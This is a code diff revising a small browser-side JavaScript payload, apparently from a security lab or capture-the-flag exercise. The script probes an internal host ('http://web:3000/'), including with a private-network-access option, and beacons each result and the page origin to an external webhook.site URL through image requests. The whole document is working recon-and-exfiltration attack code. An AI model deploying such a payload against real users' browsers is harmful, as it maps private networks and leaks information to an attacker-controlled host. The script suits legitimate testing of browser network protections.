@@ -1,31 +1,32 @@
-<script>
-const webhook =
-  "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
+const webhook = "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
 
-function report(name, value) {
-  const params = new URLSearchParams({
-    event: name,
+function report(event, value) {
+  const p = new URLSearchParams({
+    event,
     value: String(value),
     time: new Date().toISOString()
   });
-  new Image().src = webhook + "?" + params;
+  new Image().src = webhook + "?" + p;
 }
 
-report("js-started", location.origin);
+async function test(name, url, options = {}) {
+  try {
+    const r = await fetch(url, {
+      mode: "no-cors",
+      credentials: "omit",
+      cache: "no-store",
+      ...options
+    });
+    report(name, "resolved:" + r.type);
+  } catch (e) {
+    report(name, "error:" + e.name);
+  }
+}
 
-fetch("http://web:3000/", {
-  mode: "cors",
-  credentials: "omit"
-})
-.then(async response => {
-  report("internal-fetch", response.status);
-})
-.catch(error => {
-  report("internal-fetch-error", error.name);
+report("started", location.origin);
+
+test("public-control", "https://example.com/");
+test("internal-http", "http://web:3000/");
+test("internal-local", "http://web:3000/", {
+  targetAddressSpace: "local"
 });
-
-const img = new Image();
-img.onload = () => report("internal-image", "loaded");
-img.onerror = () => report("internal-image", "failed");
-img.src = "http://web:3000/favicon.ico";
-</script>
